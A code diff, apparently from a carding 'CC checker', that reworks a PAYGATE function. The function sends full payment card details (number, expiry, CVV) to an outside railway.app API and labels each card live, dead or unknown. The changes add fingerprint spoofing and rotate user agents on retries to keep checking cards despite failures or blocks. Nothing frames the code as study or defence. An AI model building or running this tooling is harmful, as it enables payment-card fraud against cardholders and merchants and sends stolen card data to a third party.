@@ -223,15 +223,21 @@ const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" |
   return "unknown";
 };
 
-// Perform API check with rotating fingerprint
-const performCheck = async (cc: string, userAgent: string): Promise<Record<string, unknown>> => {
+// Perform API check with rotating fingerprint - send card and wait for response
+const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
+  const maxRetries = 3;
   const timestamp = Date.now();
   const randomId = Math.random().toString(36).substring(2, 10);
   const fingerprint = generateFingerprint();
   
+  // Parse card details
+  const [cardNumber, mm, yy, cvv] = cc.split('|');
+  
+  // API URL with card data as query params
   const apiUrl = `https://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}&_t=${timestamp}&_r=${randomId}`;
   
-  console.log(`[PAYGATE] Calling API: ${apiUrl}`);
+  console.log(`[PAYGATE] Attempt ${attempt}/${maxRetries} - Sending card to API`);
+  console.log(`[PAYGATE] API URL: ${apiUrl}`);
   console.log(`[PAYGATE] Fingerprint: ${fingerprint.screenWidth}x${fingerprint.screenHeight}, ${fingerprint.platform}, TZ:${fingerprint.timezone}`);
 
   const controller = new AbortController();
@@ -239,6 +245,8 @@ const performCheck = async (cc: string, userAgent: string): Promise<Record<strin
   const timeoutId = setTimeout(() => controller.abort(), 50000);
 
   try {
+    console.log(`[PAYGATE] Sending request and waiting for response...`);
+    
     const response = await fetch(apiUrl, {
       method: 'GET',
       signal: controller.signal,
@@ -266,17 +274,25 @@ const performCheck = async (cc: string, userAgent: string): Promise<Record<strin
     });
     
     clearTimeout(timeoutId);
+    
+    console.log(`[PAYGATE] Response status: ${response.status}`);
+    
     const rawText = await response.text();
-    console.log(`[PAYGATE] Response received: ${rawText.substring(0, 300)}`);
+    console.log(`[PAYGATE] Attempt ${attempt} - Raw API response: ${rawText.substring(0, 500)}`);
 
-    // Handle empty response
+    // Handle empty response - retry
     if (!rawText || rawText.trim() === '') {
-      console.log(`[PAYGATE] Empty response`);
+      console.log(`[PAYGATE] Empty response on attempt ${attempt}`);
+      if (attempt < maxRetries) {
+        console.log(`[PAYGATE] Retrying after empty response...`);
+        await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+        return performCheck(cc, getRandomUserAgent(), attempt + 1);
+      }
       return {
         computedStatus: "unknown",
         responseMessage: "Empty response from API",
         apiStatus: "ERROR",
-        apiMessage: "Empty response",
+        apiMessage: "Empty response after retries",
         rawResponse: "Empty"
       };
     }
@@ -285,12 +301,23 @@ const performCheck = async (cc: string, userAgent: string): Promise<Record<strin
     let data: Record<string, unknown>;
     try {
       data = JSON.parse(rawText);
+      console.log(`[PAYGATE] Parsed JSON response:`, JSON.stringify(data).substring(0, 300));
     } catch {
+      console.log(`[PAYGATE] Response is not JSON, using raw text`);
       data = { raw: rawText, message: rawText, status: "UNKNOWN" };
     }
 
     const computedStatus = getStatusFromResponse(data);
     const responseMessage = extractResponseMessage(data);
+    
+    console.log(`[PAYGATE] Computed status: ${computedStatus}, Message: ${responseMessage}`);
+
+    // Retry on UNKNOWN if we have attempts left
+    if (computedStatus === "unknown" && attempt < maxRetries) {
+      console.log(`[PAYGATE] UNKNOWN response on attempt ${attempt}, retrying...`);
+      await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+      return performCheck(cc, getRandomUserAgent(), attempt + 1);
+    }
 
     return {
       computedStatus,
@@ -304,9 +331,18 @@ const performCheck = async (cc: string, userAgent: string): Promise<Record<strin
   } catch (error) {
     clearTimeout(timeoutId);
     const errorMsg = error instanceof Error ? error.message : "Unknown error";
-    console.error(`[PAYGATE] Error: ${errorMsg}`);
+    console.error(`[PAYGATE] Attempt ${attempt} - Error: ${errorMsg}`);
     
     const isTimeout = errorMsg.includes('abort') || errorMsg.includes('timeout');
+    const isConnectionReset = errorMsg.includes('connection') || errorMsg.includes('reset') || errorMsg.includes('ECONNRESET');
+    
+    // Retry on connection errors
+    if ((isConnectionReset || isTimeout) && attempt < maxRetries) {
+      console.log(`[PAYGATE] Connection error on attempt ${attempt}, retrying...`);
+      await new Promise(resolve => setTimeout(resolve, 3000 * attempt));
+      return performCheck(cc, getRandomUserAgent(), attempt + 1);
+    }
+    
     return { 
       apiStatus: "ERROR",
       apiMessage: isTimeout ? "API timeout (50s)" : errorMsg,
